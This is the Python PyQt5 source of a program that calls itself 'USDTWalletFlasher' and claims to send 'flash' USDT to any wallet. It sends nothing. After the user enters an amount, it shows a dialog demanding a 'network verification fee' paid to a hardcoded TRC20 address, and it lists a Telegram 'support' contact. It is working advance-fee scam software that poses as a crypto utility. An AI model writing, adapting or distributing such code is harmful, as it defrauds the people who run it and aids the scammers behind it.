import sys
import random
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QLabel, 
                            QPushButton, QLineEdit, QComboBox, QMessageBox)
from PyQt5.QtGui import QFont, QPalette, QColor, QIcon, QPixmap
from PyQt5.QtCore import Qt, QUrl
from PyQt5.QtNetwork import QNetworkRequest, QNetworkAccessManager

class USDTFlasher(QMainWindow):
    def __init__(self):
        super().__init__()
        try:
            self.setWindowTitle("USDTWalletFlasher")
            self.setFixedSize(800, 600)
            
            # Initialize values
            self.current_fee = random.randint(10, 35)
            self.daily_limit = 100000
            self.sent_today = 0
            
            # Set default icon
            self.set_default_icon()
            
            # Setup UI
            self.init_ui()
            
            # Try to load online icon (won't crash if fails)
            self.load_icon_from_url("https://raw.githubusercontent.com/WalletCrackzzz/usdt/refs/heads/main/icon.ico")
            
        except Exception as e:
            print(f"Initialization error: {e}")
            # Ensure window still opens even if initialization fails
            self.show()
    
    def set_default_icon(self):
        """Set a default blank icon to prevent crashes"""
        blank_pixmap = QPixmap(32, 32)
        blank_pixmap.fill(Qt.transparent)
        self.setWindowIcon(QIcon(blank_pixmap))
    
    def init_ui(self):
        """Initialize all UI components"""
        # Main widget
        main_widget = QWidget()
        self.setCentralWidget(main_widget)
        layout = QVBoxLayout()
        main_widget.setLayout(layout)
        
        # Dark theme
        self.set_dark_theme()
        
        # Header
        header = QLabel("USDTWalletFlasher - TETHER BLOCKCHAIN UTILITY")
        header.setFont(QFont('Arial', 14, QFont.Bold))
        header.setAlignment(Qt.AlignCenter)
        layout.addWidget(header)
        
        # Stats
        stats = QLabel(f"""Exchange Compatible: Binance | Coinbase | Kraken\n"""
                      f"""Wallet Compatible: Any Wallet | Any Exchange\n"""
                      f"""Daily Limit: {self.daily_limit:,} USDT | Sent Today: {self.sent_today:,} USDT""")
        stats.setFont(QFont('Arial', 10))
        stats.setStyleSheet("margin-bottom: 20px;")
        layout.addWidget(stats)
        
        # Recipient
        layout.addWidget(QLabel("Recipient USDT Address:"))
        self.recipient_input = QLineEdit()
        self.recipient_input.setStyleSheet("padding: 8px;")
        layout.addWidget(self.recipient_input)
        
        # Amount
        layout.addWidget(QLabel("Amount USDT:"))
        self.amount_input = QLineEdit()
        self.amount_input.setStyleSheet("padding: 8px;")
        layout.addWidget(self.amount_input)
        
        # Network
        layout.addWidget(QLabel("Network:"))
        self.network_combo = QComboBox()
        self.network_combo.addItems(["TRC20", "ERC20", "BEP20", "SOLANA", "POLYGON"])
        self.network_combo.setStyleSheet("padding: 8px;")
        layout.addWidget(self.network_combo)
        
        # Send button
        self.send_btn = QPushButton("FLASH USDT NOW")
        self.send_btn.setStyleSheet("""
            background-color: #2d5c7f; 
            color: white; 
            font-weight: bold;
            padding: 12px;
            font-size: 14px;
            border-radius: 4px;
        """)
        self.send_btn.clicked.connect(self.process_transaction)
        layout.addWidget(self.send_btn)
        
        # Support button
        support_btn = QPushButton("Contact Support @USDTWalletFlasher")
        support_btn.setStyleSheet("""
            background-color: #5c2d7f; 
            color: white;
            padding: 10px;
            font-size: 12px;
            border-radius: 4px;
        """)
        support_btn.clicked.connect(self.contact_support)
        layout.addWidget(support_btn)
        
        # Status
        self.status = QLabel("Status: Ready")
        self.status.setFont(QFont('Arial', 10))
        self.status.setStyleSheet("margin-top: 20px; color: #4CAF50;")
        layout.addWidget(self.status)
        
        layout.addStretch()
    
    def set_dark_theme(self):
        """Configure dark theme for the application"""
        dark_palette = self.palette()
        dark_palette.setColor(QPalette.Window, QColor(10, 10, 10))
        dark_palette.setColor(QPalette.WindowText, Qt.white)
        dark_palette.setColor(QPalette.Base, QColor(20, 20, 20))
        dark_palette.setColor(QPalette.Text, Qt.white)
        dark_palette.setColor(QPalette.Button, QColor(35, 35, 35))
        dark_palette.setColor(QPalette.ButtonText, Qt.white)
        self.setPalette(dark_palette)
    
    def load_icon_from_url(self, url):
        """Safely attempt to load icon from URL"""
        try:
            self.network_manager = QNetworkAccessManager()
            self.network_manager.finished.connect(self.handle_icon_response)
            request = QNetworkRequest(QUrl(url))
            self.network_manager.get(request)
        except Exception as e:
            print(f"Error starting icon download: {e}")
    
    def handle_icon_response(self, reply):
        """Handle the icon download response"""
        try:
            if reply.error():
                print(f"Icon download error: {reply.errorString()}")
                return
            
            data = reply.readAll()
            pixmap = QPixmap()
            if pixmap.loadFromData(data):
                self.setWindowIcon(QIcon(pixmap))
            reply.deleteLater()
        except Exception as e:
            print(f"Error processing icon: {e}")
    
    def process_transaction(self):
        """Handle the transaction process"""
        try:
            recipient = self.recipient_input.text().strip()
            amount = self.amount_input.text().strip()
            
            if not recipient or not amount:
                self.update_status("Error - Enter all details", "#F44336")
                return
            
            try:
                amount_num = float(amount)
                if amount_num <= 0:
                    raise ValueError
                
                if amount_num > (self.daily_limit - self.sent_today):
                    remaining = self.daily_limit - self.sent_today
                    self.update_status(f"Error - Daily limit exceeded (Remaining: {remaining:,} USDT)", "#F44336")
                    return
                    
            except ValueError:
                self.update_status("Error - Invalid amount", "#F44336")
                return
            
            self.update_status("Processing transaction...", "#FFC107")
            QApplication.processEvents()
            
            # Simulate processing delay
            QApplication.processEvents()
            
            # Show payment request
            self.show_payment_request(amount_num)
            
            self.sent_today += amount_num
            self.update_status(f"Awaiting {self.current_fee} USDT fee payment | Sent today: {self.sent_today:,} USDT", "#4CAF50")
            
        except Exception as e:
            print(f"Transaction error: {e}")
            self.update_status("System error - Try again", "#F44336")
    
    def update_status(self, message, color):
        """Update status label safely"""
        self.status.setText(f"Status: {message}")
        self.status.setStyleSheet(f"color: {color};")
    
    def show_payment_request(self, amount):
        """Show the payment request dialog"""
        msg = QMessageBox()
        msg.setWindowTitle("Network Fee Required")
        msg.setText(f"""Transaction of {amount:,.2f} USDT requires network verification fee:
        
{self.current_fee} USDT (TRC20)

Send to:
TW62bBbH5UFtztA6x3zWRHkhPWKpkR8Pfu

Your USDT will be sent immediately after fee confirmation.""")
        msg.exec_()
    
    def contact_support(self):
        """Show contact information"""
        QMessageBox.information(self, "Contact Support", 
                              "Telegram support: @USDTWalletFlasher\n\n"
                              "For transaction verification and assistance.")

if __name__ == "__main__":
    try:
        app = QApplication(sys.argv)
        app.setStyle('Fusion')
        window = USDTFlasher()
        window.show()
        sys.exit(app.exec_())
    except Exception as e:
        print(f"Fatal error: {e}")
